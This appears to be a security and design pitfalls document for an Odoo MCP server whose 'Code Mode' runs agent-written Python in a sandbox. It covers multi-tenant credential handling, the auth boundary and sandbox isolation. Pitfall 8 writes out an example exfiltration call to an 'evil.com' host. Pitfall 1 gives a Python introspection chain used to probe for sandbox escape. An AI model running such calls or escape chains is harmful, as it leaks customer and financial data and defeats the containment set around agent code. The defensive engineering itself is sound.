# Pitfalls Research

**Domain:** FOSS stateless MCP server — Odoo RPC primitives + Code Mode sandbox + per-user multi-tenant credential handling
**Researched:** 2026-06-01
**Confidence:** HIGH (CVEs and GitHub issues corroborate most claims; Odoo-specific items MEDIUM from official docs + community)

---

## Critical Pitfalls

### Pitfall 1: Sandbox Escape via Python Introspection (Code Mode)

**What goes wrong:**
Agent-authored Python code inside `execute_odoo_code` escapes the restricted execution environment using CPython introspection. Common vectors: `__class__.__mro__`, frame traversal via caught exceptions, numeric class indexes to reach `subprocess.Popen` without importing `os`, and dunder attribute chains to expose the real builtins dict. CVE-2026-39888 (PraisonAI) and JFSA-2025-001434277 (smolagents) are real-world examples of this exact failure in similar sandbox designs.

**Why it happens:**
Developers restrict `__builtins__` and add an AST blocklist but miss that Python's object graph is reachable from any object through `__class__`, `__subclasses__()`, `__globals__`, and exception frame objects. A subprocess-mode sandbox that still runs CPython with restricted globals is not a sandbox — it is a slowed attacker.

**How to avoid:**
- Do NOT implement a restricted-builtins CPython sandbox for Wave 3. It cannot be made secure against a motivated LLM.
- Use a true isolation boundary: Docker sidecar (preferred) with no host mounts, no network, seccomp profile, read-only root FS, and a hard-kill timeout. The subprocess inside the container is expendable.
- If subprocess-only (no Docker), use `seccomp`, `rlimit`, and `unshare` system calls from the parent to create a restricted namespace — never rely on Python-level builtins restriction alone.
- Replace any `execSync`-style shell-string invocation with `execFileSync`/`subprocess.run([...], shell=False)` argument arrays — this prevents shell metacharacter injection (CVE-2025-53372 root cause).
- Rate-limit and hard-timeout every invocation at the process level (SIGKILL after N seconds), not inside the sandbox.

**Warning signs:**
- You can call `().__class__.__mro__[-1].__subclasses__()` inside your test harness and get a non-empty list — sandbox is porous.
- Any `exec()`, `eval()`, `compile()`, or `__import__` not explicitly blocked by the AST walker.
- Test: can sandboxed code open a TCP socket? If yes, network egress is not blocked.

**Phase to address:** Wave 3 — sandbox isolation mechanism decision. Security requirements are non-negotiable per charter. Do not ship Code Mode without a passing adversarial escape test suite.

---

### Pitfall 2: Cross-User Credential / Cache Bleeding

**What goes wrong:**
One user's Odoo credentials or cached catalog data are served to a different user's request. In a stateless multi-tenant server, this happens when: (a) cache keys omit the user identity component (`url+db` only, missing `username`), (b) a connection pool reuses an authenticated Odoo session across users, or (c) an in-flight async request stores user state in a shared mutable location (class variable, module-level dict keyed only by model name).

**Why it happens:**
The Asana MCP multi-tenant breach (June 2025) shows this is the most common MCP multi-tenant failure mode. Developers think "each request is stateless" but the shared in-process cache is stateful. A cache key of `(model_name, fields)` looks correct but ignores that two users on the same Odoo instance may have different field visibility due to group-based field access.

**How to avoid:**
- Cache key schema (enforced at code review): `(odoo_url, database, username, <object>)`. Username must be part of every cache key, even for catalog entries that seem instance-global.
- The `godoo` client must be instantiated per-request from headers — never held in a shared variable between requests. If the library maintains connection state, verify it is not reused across users.
- Run a test with two users on the same Odoo instance with different field permissions; assert they receive different field lists.
- In async handlers: never store user credentials in context variables that escape the request lifecycle.

**Warning signs:**
- Cache key definition missing `username` field.
- `godoo` client instantiated at module import time or as a class attribute.
- Integration test uses only one test user.

**Phase to address:** Wave 1 (credential resolution) — the cache key schema must be right from day one. Wave 2 validates it with the full catalog cache.

---

### Pitfall 3: Header Trust Without Proxy Verification (Auth Boundary)

**What goes wrong:**
`godoo-mcp-server` trusts `X-Odoo-*` headers unconditionally. In a direct-access deployment (no `godoo-proxy` in front), any caller can set `X-Odoo-Url`, `X-Odoo-Username`, and `X-Odoo-Password` to arbitrary values and impersonate any Odoo user — including admin. The server becomes a credential relay with no gate.

**Why it happens:**
The design is intentional for the proxy-injected case, but the threat model changes completely in self-hosted deployments where the server is exposed to the network. Developers ship with "intended for internal use" and forget to document the exposure boundary.

**How to avoid:**
- The server itself cannot solve this (it would need to become a gateway). Instead: document explicitly in README and ops guide that direct network exposure without `godoo-proxy` or equivalent header-stripping ingress means the caller controls which Odoo user the server acts as.
- For self-hosted deployments, recommend: run behind a reverse proxy that strips `X-Odoo-*` before forwarding, and sets them from a server-side config. Or use env-var-only auth (no headers accepted).
- Optionally: add a `--trust-headers` / `--no-trust-headers` flag at startup; default to env-var-only when the flag is absent, requiring explicit opt-in to header mode.
- Document the threat model in security.md: "header mode = gateway delegates auth; env-var mode = single-user server; never expose header mode to the public internet without a trusted proxy."

**Warning signs:**
- No mention of this tradeoff in the README.
- No ops documentation distinguishing proxy-mode vs. direct-mode deployments.
- The Docker Compose example exposes port 8000 to `0.0.0.0` with no proxy.

**Phase to address:** Wave 1 — document the auth boundary in the same commit that wires credential resolution.

---

### Pitfall 4: ACL Probe Gives False Sense of Security

**What goes wrong:**
`check_access_rights` on a model checks model-level ACL (can this user call `read` on `res.partner`?) but does NOT enforce record rules. Record rules (`ir.rule`) are domain-based filters applied at the ORM level that restrict which records a user can see. An ACL probe that passes does not mean the user can see any specific record. Conversely, a probe that fails may be an overly conservative `sudo=False` check that the ORM would not actually raise on a real search.

**Why it happens:**
Odoo has two separate security layers. `check_access_rights` is cheap and model-level. `check_access_rule` (and `_check_record_rules`) are per-record and domain-based. The `probeAclForCuratedTools` pattern only covers the first layer.

**How to avoid:**
- Understand the scope: ACL probe is for tool visibility (should the agent even see `delete_record`?), not for record-level authorization. The latter is enforced transparently by Odoo's ORM when the godoo client makes the actual call — Odoo will raise `AccessError` if a record rule blocks the operation.
- Document clearly in skill files and tool descriptions: "the tool being visible does not guarantee access to any specific record."
- Do not cache ACL probe results long-term without a TTL that accounts for group membership changes. If a user's groups change in Odoo, their cached ACL probe may be stale.
- Write a test: user with read-only group sees `create_record` absent from tool list; user with write group sees it present.

**Warning signs:**
- ACL probe result cached longer than catalog TTL without independent invalidation.
- Tool descriptions imply "you have access" rather than "operation is available, subject to record rules."
- No test covering a user whose group changes mid-session.

**Phase to address:** Wave 2 (ACL probe implementation).

---

### Pitfall 5: Streamable HTTP Session ID vs. Stateless Conflict

**What goes wrong:**
The MCP Streamable HTTP transport optionally issues an `Mcp-Session-Id` header after `/initialize`. Clients that store this ID and send it on subsequent requests will be rejected with `400 Bad Request: Missing session ID` if the server has restarted (in-process session table cleared) or if a load balancer routes to a different instance. This is particularly painful because the MCP python-sdk has an open bug (issue #1063) where custom HTTP headers including `mcp-session-id` are not reliably forwarded by the FastMCP transport layer.

**Why it happens:**
The server is intentionally stateless, but the MCP spec allows (and some clients expect) session affinity via `Mcp-Session-Id`. If the server emits a session ID header, it implicitly promises to honor it — but cannot, across restarts or replicas.

**How to avoid:**
- For a stateless server: configure the transport to NOT issue `Mcp-Session-Id` (stateless mode in the python-sdk). Every request is treated as independent.
- Verify `quickdoo` and Claude Desktop/Claude Code behave correctly with a stateless server — they must not require session continuity for tool calls.
- Do not use the SSE (deprecated) transport; Streamable HTTP is correct, but validate `Content-Type: application/json` vs `text/event-stream` is sent correctly for streaming vs non-streaming responses.
- Test with multiple client implementations: Claude Code (Anthropic), quickdoo, and at least one generic MCP client. Protocol version mismatches surface early this way.

**Warning signs:**
- Server logs show session ID generation at startup or per-request.
- Clients connect, call `/initialize`, then fail on tool calls with session-related errors after a server restart.
- `Content-Type` header on streaming responses is `application/json` instead of `text/event-stream`.

**Phase to address:** Wave 1 (server skeleton). Must be settled before any integration test.

---

### Pitfall 6: Odoo Catalog Introspection Cost at Cold Start

**What goes wrong:**
On a large Odoo instance (200+ installed modules), calling `fields_get()` for all models, `ir.actions.act_window`, and `ir.ui.menu` in sequence can take 15–60 seconds. If this happens synchronously on the first request, the MCP client times out before receiving a tool list. If it happens per-request without caching, every tool call is preceded by a 30-second RPC storm.

**Why it happens:**
Each `fields_get()` call is a network round trip. A large instance has 400+ models; enumerating all of them without pagination and caching will saturate Odoo's worker pool and trigger timeout on the MCP client side. The `odoo-api-proxy` TypeScript predecessor caches this with schema-hash invalidation precisely because of this cost.

**How to avoid:**
- Cache is not optional — it is required for correctness at production scale. Design the LRU+TTL cache before wiring any catalog tool.
- Lazy-load catalog by namespace: fetch mail.* models only when a mail tool is called, not all 400 models at startup.
- Or: enumerate `ir.model` records (cheap, one call) to get the model list, then fetch `fields_get` lazily per model on first access.
- Warm the cache asynchronously in a background task after startup, not synchronously on first request.
- Cold-start cost after restart is acceptable per charter, but must not block the first tool call.

**Warning signs:**
- Integration test against a real Odoo instance times out during `/initialize` or first tool call.
- No cache TTL or schema-hash invalidation in Wave 2 implementation.
- `fields_get` called on every tool call (no cache miss logging).

**Phase to address:** Wave 2 (catalog introspection + cache design).

---

### Pitfall 7: Schema Drift — Stale Catalog After Odoo Upgrade or Module Install

**What goes wrong:**
The in-process LRU+TTL cache holds field metadata. After an Odoo module is installed or upgraded (adding/removing fields), the cached schema is stale. Agents make tool calls referencing fields that no longer exist (or miss fields that were added), getting confusing `KeyError` / `Invalid field` errors from Odoo with no indication that the cache is the cause.

**Why it happens:**
TTL-based caches evict after time, but module installs happen instantly and unpredictably. The schema-hash invalidation strategy (compute a hash of `ir.model.fields` count + version + last-modified) addresses this, but only if the hash is checked frequently enough.

**How to avoid:**
- Implement schema-hash invalidation from day one in Wave 2: on each catalog access, fetch a lightweight hash (e.g., `search_count` on `ir.model.fields` + Odoo `server_version`) and compare to cached hash; invalidate on mismatch.
- The hash check itself must be cheap — a single `search_count` RPC, not a full `fields_get`. Cache the hash with a short TTL (30–60 seconds).
- Expose a `/refresh-catalog` endpoint (or MCP tool) that forces cache eviction — useful during development and Odoo upgrades.
- Document: cache is lost on server restart (expected); after Odoo module install, wait up to TTL seconds or restart server.

**Warning signs:**
- No schema hash stored alongside cached catalog.
- `fields_get` results differ between two consecutive integration test runs after a model change.
- No cache invalidation test in the test suite.

**Phase to address:** Wave 2 (catalog cache design).

---

### Pitfall 8: Code Mode Network Egress from Sandbox

**What goes wrong:**
Agent-authored code in `execute_odoo_code` calls `requests.get("https://evil.com/exfil", data=secret_data)`. The sandbox does not block outbound network. Sensitive Odoo data (customer records, financial data) is exfiltrated to an external endpoint. This is a charter non-negotiable violation.

**Why it happens:**
Subprocess sandboxes do not restrict network by default. Even Docker containers have full outbound network unless `--network none` is specified. Developers assume "the code can only use godoo client" but do not enforce it.

**How to avoid:**
- Docker sidecar: `--network none` or a custom bridge with only the godoo proxy endpoint whitelisted via iptables. No public internet access from the container.
- Subprocess: use Linux network namespaces (`unshare --net`) + `iptables` to allow only loopback + the godoo RPC socket. Not portable to macOS/Windows dev machines — use Docker there.
- AST-level block `import socket`, `import requests`, `import urllib`, `import httpx` as a second layer of defense (not primary — it can be bypassed, but it raises the bar and catches accidental use).
- Include network egress test in CI: sandbox code that calls `socket.connect(("8.8.8.8", 53))` must raise, not succeed.

**Warning signs:**
- Integration test can reach the internet from inside the sandbox.
- Docker sidecar started without `--network none`.
- Subprocess sandbox has no network namespace isolation.

**Phase to address:** Wave 3 (Code Mode) — must pass adversarial network egress test before merge.

---

### Pitfall 9: Code Mode Write Operations Without Capability Gate

**What goes wrong:**
`execute_odoo_code` defaults to read-only but the sandbox allows write calls to godoo client (`env.create`, `env.write`, `env.unlink`) without requiring explicit capability grant. An agent performing a "search and analyze" task accidentally (or via prompt injection) mutates production Odoo records.

**Why it happens:**
The godoo client inside the sandbox has the same interface for reads and writes. Without a capability gate, the sandbox trust boundary is "agent wrote Python that calls godoo" — which is as broad as full Odoo user access.

**How to avoid:**
- Per-invocation capability manifest: the caller of `execute_odoo_code` must pass `{"capabilities": ["read"]}` or `{"capabilities": ["read", "write"]}` in the tool arguments. The sandbox intercepts godoo calls and enforces this at the RPC proxy layer.
- Default capability: `["read"]` only. Write capability must be explicitly requested and approved (or agent-asserted in the tool call — depending on trust model).
- Audit log every invocation with its capability set, the code submitted, and the RPC calls made.

**Warning signs:**
- `execute_odoo_code` tool has no `capabilities` parameter.
- A read-only test user can run code that successfully creates a record.
- No audit log entries for Code Mode invocations.

**Phase to address:** Wave 3 (Code Mode) — capability gate is in charter scope and non-negotiable.

---

### Pitfall 10: Skills-as-Resources Discovery Index Drift

**What goes wrong:**
Skill Markdown files are added or updated but `index.json` is not updated. MCP clients query the resource index and cannot discover new skills. Agents use outdated skill versions or miss new guidance entirely, silently operating without the skill context that makes Code Mode useful.

**Why it happens:**
Manual maintenance of a JSON index alongside content files. It is the same problem as a man page that was not regenerated after the source changed. Also: skill files served as MCP Resources may not surface to the agent if the client does not call `resources/list` — agents may only call `tools/list` and miss the resource layer entirely.

**How to avoid:**
- Generate `index.json` from the filesystem (glob `*.md` in skill directories) at server startup, not statically. This eliminates drift entirely.
- Add a startup assertion: every file referenced in `index.json` exists; every `.md` file in the skill directories appears in `index.json`. Fail loudly at startup if either check fails.
- In skill files and tool descriptions, explicitly tell agents to read the `SKILL.md` resource before attempting Code Mode. This is a prompt-engineering concern but should be in the tool description.
- Test: after adding a new skill file, confirm it appears in `resources/list` response without manual index update.

**Warning signs:**
- `index.json` is committed as a static file with no generation step.
- New `.md` file added but `index.json` not touched in the same commit.
- Integration test does not verify `resources/list` includes all skill files.

**Phase to address:** Wave 2 (skills as MCP Resources).

---

### Pitfall 11: godoo Pin Drift and Breaking Changes

**What goes wrong:**
`godoo` is pinned `>=1.1,<1.2` but a minor version `1.1.x` release introduces a breaking change in the typed model API (e.g., a field type changes from `str` to `int | str`, or a method signature changes). The server breaks in production without a godoo version bump in the changelog. Alternatively, the pin is widened to `>=1.1` and a major API change in `1.2` silently breaks field introspection.

**Why it happens:**
`godoo` is an active library under development in the same monorepo family. The `<1.2` upper bound is correct discipline but only useful if the exact `1.1.x` API surface the server depends on is verified at each godoo release.

**How to avoid:**
- Pin to `>=1.1,<1.2` as decided. Additionally: in CI, run integration tests against the oldest `1.1.x` released and the latest `1.1.x` released — both must pass.
- Document the specific godoo API calls used (the typed models, RPC methods) so godoo maintainers know what not to break. A one-page `godoo_api_surface.md` in `.planning/` is sufficient.
- When godoo releases `1.2`, allocate a deliberate upgrade issue: review changelog, update pin, rerun integration tests.

**Warning signs:**
- Integration tests pass only against a specific godoo version that happens to be installed.
- `requirements.txt` / `pyproject.toml` uses `>=1.1` without upper bound.
- CI matrix does not vary godoo version.

**Phase to address:** Wave 1 (dependency setup) — pin must be in `pyproject.toml` from first commit. Wave 2 validates it holds under catalog workload.

---

### Pitfall 12: pip vs Docker Environment Parity

**What goes wrong:**
`pip install godoo-mcp-server` resolves a different set of transitive dependencies than the Docker image built with `pip install -r requirements.lock`. Production incidents where the Docker image works but the pip install (used in quickdoo embedded mode) crashes, or vice versa. Also: godoo-py published to PyPI differs from the local development version, causing "works on my machine" failures.

**Why it happens:**
Python dependency resolution is non-deterministic without a lockfile. Two installs at different times will pick different patch versions of transitive deps. Docker images built without a lockfile diverge from pip installs over time.

**How to avoid:**
- Maintain a `requirements.lock` generated by `pip-compile` (pip-tools) from `pyproject.toml`. Dockerfile uses `pip install --no-deps -r requirements.lock`. pip users install from `pyproject.toml` (flexible) but CI tests with the lock.
- Tag Docker images with the godoo version embedded: `godoo-mcp-server:1.0.0-godoo1.1.3`. Keeps traceability.
- In CI: build the Docker image and run the same integration test suite used for pip install.

**Warning signs:**
- Dockerfile uses `pip install .` without `--no-deps` and a lockfile.
- `requirements.lock` is gitignored or absent.
- No CI job that builds the Docker image.

**Phase to address:** Wave 1 (project setup) — lockfile strategy must be in place before any dependency is added.

---

### Pitfall 13: Odoo Field and Model Variance Across Versions and Customizations

**What goes wrong:**
The server's skill files or tool descriptions reference specific fields (`sale.order.amount_total`, `res.partner.category_id`) that may not exist on a given Odoo instance (wrong version, field not installed, Studio field named differently). Agents follow skill guidance, call `get_fields` for a model, and get back a different field set than the skill assumes. Confusion compounds when the agent retries with the wrong field name.

**Why it happens:**
Every Odoo instance is customized. Field names that are standard in vanilla Odoo 17 may be absent in Odoo 16, renamed in Odoo 18, or replaced by a Studio-generated field in a client's instance. Skills written against one instance are treated as universal truth.

**How to avoid:**
- Skill files must be written as procedural guides ("first call `get_fields` to discover available fields") NOT as field references ("use the `amount_total` field"). Discovery-first, assume-nothing.
- In skill files, include explicit disclaimers: "field names vary by Odoo version and module; always verify with `get_fields` before using."
- The `probeAclForCuratedTools` pattern should check whether the model exists before exposing tools that depend on it (e.g., mail tools only appear if `mail.message` model is accessible).
- Do not hardcode field lists anywhere in server code — always derive from `fields_get()` results.

**Warning signs:**
- Skill file contains literal field names without a preceding `get_fields` step.
- Server code contains a dict like `STANDARD_FIELDS = {"res.partner": ["name", "email", ...]}`.
- Integration test only runs against one Odoo version.

**Phase to address:** Wave 2 (skills port + catalog introspection). Applies retroactively to Wave 1 if any tool descriptions reference field names.

---

### Pitfall 14: MCP Tool List Instability Confusing Agents

**What goes wrong:**
Per-user ACL probe causes the tool list to differ between users. A user loses a group membership in Odoo, reconnects, and the tool list shrinks mid-conversation. The agent's context window still contains tool descriptions for tools that no longer appear in the list; it calls a missing tool and gets an error it cannot recover from. Claude Code has an open bug (issue #38043, issue #15758) where tools permanently disappear after a transient server disconnect even after reconnection.

**Why it happens:**
Dynamic tool lists are a feature of MCP but clients handle them inconsistently. The `notifications/tools/list_changed` notification is the correct mechanism, but not all clients implement it, and some clients (Claude Code) have race conditions where tool disappearance is permanent for the session.

**How to avoid:**
- Cache ACL probe results with the same TTL as the catalog. Do not re-probe on every request — this would cause tool list instability at RPC latency timescales.
- When ACL probe changes between cache refresh cycles, send `notifications/tools/list_changed` to give clients a chance to reload. Implement this notification properly.
- Document the known limitation: tool list is stable within a cache TTL window, but may change on reconnect if Odoo group membership changed.
- Test: simulate a user group change; verify the notification is sent; verify the client receives the updated list without session disruption.

**Warning signs:**
- No `notifications/tools/list_changed` implementation.
- ACL probe called on every request (will cause list to flicker).
- Integration test uses a user whose group membership never changes.

**Phase to address:** Wave 2 (ACL probe + tool surface).

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Skip schema-hash invalidation, TTL-only cache | Simpler Wave 2 implementation | Stale catalog after module install with no signal | Never — add it in Wave 2 |
| Use `asyncio.run()` per request instead of async server framework | Avoids async complexity | Blocks event loop on each Odoo RPC; cannot handle concurrent requests | Never for production |
| Trust `check_access_rights` as the full ACL | Saves one extra probe call | Tools appear for users who cannot actually use them; confuses agents | Acceptable in Wave 1 if documented as known limitation, fixed in Wave 2 |
| Use Python-level builtins restriction for Code Mode sandbox | Faster to ship Wave 3 | Sandbox escape via introspection (known CVE pattern) | Never — use OS-level isolation |
| Single test user in integration tests | Simpler CI setup | Never catches cross-user credential bleed | Acceptable only in Wave 1; Wave 2 must add multi-user tests |
| Static `index.json` for skill resources | No generation code needed | Index drifts from actual files | Acceptable in Wave 2 MVP if CI validates it; eliminated in Wave 3 |
| Broad godoo pin `>=1.1` | Avoids pin management | Silently breaks on 1.2 | Never — use `>=1.1,<1.2` per charter |

---

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| godoo client | Instantiate once at module level, reuse across requests | Instantiate per-request from resolved credentials; treat as ephemeral |
| Odoo `fields_get` | Call for all models at startup | Lazy-load per namespace; cache aggressively |
| Odoo `check_access_rights` | Call `sudo=False` with model-level check, assume record access granted | Document: model ACL ≠ record rule; Odoo ORM enforces record rules automatically on actual calls |
| MCP `Mcp-Session-Id` | Default to stateful session tracking | Configure for stateless mode; do not emit session IDs |
| MCP SSE streaming | Return `Content-Type: application/json` for all responses | Return `text/event-stream` for streaming responses; `application/json` for non-streaming |
| Docker Code Mode container | Start container with default network | Explicitly pass `--network none`; whitelist only internal RPC endpoint |
| Odoo XML-RPC auth | Cache the session `uid` and reuse across users | Never share a session uid across users; each user's `uid` is separate |
| X-Odoo-* headers | Accept any incoming header unchecked | Document trust model; consider `--trust-headers` flag for explicit opt-in |

---

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Synchronous full catalog build on first request | MCP client timeout during tool list fetch | Async warm cache on startup; return minimal tool list while warming | Any Odoo instance with >100 models |
| `fields_get` per model per request (no cache) | Every tool call takes 2–10x longer due to RPC overhead | LRU cache with schema-hash invalidation | Immediately on any real instance |
| ACL probe per request (no cache) | Tool list computation adds 500ms–2s per call | Cache ACL result with TTL matching catalog | Any instance with >5 concurrent users |
| Code Mode without hard kill timeout | One slow/infinite agent script blocks server | `SIGKILL` after N seconds at OS level | First time an agent writes a `while True:` loop |
| Large record sets in `read_records` without pagination | Memory spike, Odoo worker OOM | Enforce `limit` parameter default (e.g., 80); document pagination pattern in skills | Any model with >10K records |

---

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Python-level `__builtins__` restriction as sole sandbox | Sandbox escape via introspection (CVE-2026-39888 pattern) | OS-level isolation (Docker `--network none`, seccomp, namespace) |
| `exec()` of agent code with `shell=True` | Shell metacharacter injection (CVE-2025-53372 root cause) | `subprocess.run([...], shell=False)` argument arrays only |
| Cache key without username | Cross-user data bleed | Cache key = `(url, db, username, object)` — always |
| Session uid reuse across users | User A sees User B's Odoo data | Per-request godoo client instantiation |
| Hardcoded credential in Docker Compose example | Credential committed to repo | Env-var only in examples; document in ops guide |
| Code Mode with network access | Odoo data exfiltration | `--network none` on Docker container; validate in CI |
| No rate limit on `execute_odoo_code` | Resource exhaustion / DoS of Odoo backend | Per-user rate limit; hard invocation timeout (charter requirement) |
| No audit log on Code Mode | Cannot investigate incidents | Structured log per invocation: user, code hash, capabilities, RPC calls made, duration |
| Broad file access in Code Mode subprocess | Exfiltration of server secrets (`.env`, keys) | Read-only root FS in Docker; no host mounts; seccomp blocks `open()` for paths outside allowed set |

---

## "Looks Done But Isn't" Checklist

- [ ] **Credential resolution:** Headers parsed and precedence implemented — verify env-var fallback path is also tested; "no creds" path returns a clear error, not a Python `AttributeError`.
- [ ] **Cache key security:** Cache populated — verify the key includes username by querying two different users and confirming separate cache entries exist.
- [ ] **ACL probe:** Tool list filtered — verify a user with no write group cannot call `create_record`; verify the filter updates after group membership change.
- [ ] **Code Mode sandbox:** Sandbox runs code — verify it cannot reach the internet; verify it cannot write files outside `/tmp`; verify it cannot call non-godoo RPC endpoints.
- [ ] **Skills as Resources:** `resources/list` returns skill files — verify all `.md` files appear; verify `index.json` matches filesystem; verify an agent can read a skill by URI.
- [ ] **Schema-hash invalidation:** Cache exists — verify cache is invalidated after a model field is added to the Odoo test instance.
- [ ] **godoo pin:** `pyproject.toml` has `>=1.1,<1.2` — verify CI fails if godoo `1.2.x` is installed.
- [ ] **Streamable HTTP stateless mode:** Server starts — verify it does NOT emit `Mcp-Session-Id` headers in stateless mode; verify reconnect after server restart does not cause session error.

---

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Cross-user credential bleed discovered in production | HIGH | Immediately rotate all Odoo credentials used; audit Odoo server access logs for unauthorized operations; fix cache key schema; redeploy |
| Sandbox escape in Code Mode | HIGH | Disable `execute_odoo_code` tool immediately via feature flag; review audit logs for exfiltrated data; switch to Docker sidecar if using subprocess; patch and redeploy |
| Stale catalog causing agent tool call failures | LOW | Restart server (clears in-process cache); or implement `/refresh-catalog` endpoint; communicate to users: "tool catalog refreshing" |
| Skills index drift (agent cannot find skill) | LOW | Add missing skill to `index.json`; redeploy; no data loss |
| godoo breaking change in 1.1.x patch | MEDIUM | Pin to exact godoo version that worked; file issue upstream; fix API call; bump pin |
| Auth boundary misconfigured (headers exposed to internet) | HIGH | Add reverse proxy stripping X-Odoo-* headers; rotate Odoo credentials if exposure window is unknown |
| Code Mode without rate limit gets DoS'd | MEDIUM | Add rate limit middleware; restart server; add Odoo worker concurrency limit as backstop |

---

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Sandbox escape (Python introspection) | Wave 3 — before Code Mode merge | Adversarial escape test suite passes |
| Cross-user credential bleed | Wave 1 — credential resolution | Two-user integration test shows separate cache entries |
| Header trust / auth boundary | Wave 1 — credential resolution | README documents threat model; test with no-header and header modes |
| ACL probe false sense of security | Wave 2 — ACL probe implementation | Test: read-only user cannot call write tools; record-level errors still raised by Odoo |
| Streamable HTTP session ID conflict | Wave 1 — server skeleton | Reconnect test after server restart; quickdoo connects cleanly |
| Catalog introspection cold-start cost | Wave 2 — catalog + cache | Integration test on real Odoo instance completes within 5 seconds |
| Schema drift / stale catalog | Wave 2 — cache design | Schema-hash invalidation test: field added, catalog refreshes within TTL |
| Network egress from Code Mode | Wave 3 — sandbox mechanism | CI test: sandbox code cannot reach 8.8.8.8:53 |
| Write ops without capability gate | Wave 3 — Code Mode capabilities | Read-only capability: `env.create` raises; write capability: succeeds |
| Skills index drift | Wave 2 — skills as Resources | Startup assertion: all `.md` files in `index.json`; CI validates |
| godoo pin drift | Wave 1 — dependency setup | CI matrix tests oldest and latest 1.1.x godoo |
| pip vs Docker parity | Wave 1 — project setup | CI runs same integration tests against Docker image and pip install |
| Field/model variance across Odoo versions | Wave 2 — skills port | Skill files have no literal field references; discovery-first pattern |
| Tool list instability | Wave 2 — ACL probe + tool surface | Group membership change triggers list_changed notification; stable within TTL |

---

## Sources

- CVE-2025-53109, CVE-2025-53110 — Anthropic Filesystem MCP Server sandbox escape: https://cymulate.com/blog/cve-2025-53109-53110-escaperoute-anthropic/
- CVE-2025-53372 — Docker sandbox escape in node-code-sandbox-mcp: https://vulnerablemcp.info/vuln/cve-2025-53372-sandbox-escape-mcp.html
- CVE-2026-39888 — PraisonAI sandbox escape via exception frame traversal: https://advisories.gitlab.com/pkg/pypi/praisonaiagents/CVE-2026-39888/
- JFSA-2025-001434277 — Smolagents local Python sandbox escape: https://research.jfrog.com/vulnerabilities/smolagents-local-python-sandbox-escape-jfsa-2025-001434277/
- MCP security breach timeline (Asana cross-tenant, Smithery path traversal, GitHub PAT): https://authzed.com/blog/timeline-mcp-breaches
- LibreChat stale tool cache / tools list invalidation: https://github.com/danny-avila/LibreChat/pull/8384
- Claude Code tools permanently removed after disconnect: https://github.com/anthropics/claude-code/issues/38043
- MCP python-sdk issue: custom HTTP headers not received by FastMCP: https://github.com/modelcontextprotocol/python-sdk/issues/1063
- Multi-tenant MCP credential leakage patterns: https://albato.com/blog/publications/embedded-multi-tenant-mcp-saas
- Odoo security — two-layer model (ACL + record rules): https://www.odoo.com/documentation/19.0/developer/reference/backend/security.html
- Running untrusted Python code (introspection escape techniques): https://healeycodes.com/running-untrusted-python-code
- Python sandbox escape techniques (dunder attribute traversal): https://github.com/mahaloz/ctf-wiki-en/blob/master/docs/pwn/linux/sandbox/python-sandbox-escape.md
- MCP Streamable HTTP session management and stateless mode: https://mcpcat.io/guides/building-streamablehttp-mcp-server/
- SSE vs Streamable HTTP client compatibility: https://github.com/orgs/modelcontextprotocol/discussions/16

---
*Pitfalls research for: godoo-mcp-server — stateless MCP server, Odoo RPC primitives, multi-tenant, Code Mode sandbox*
*Researched: 2026-06-01*
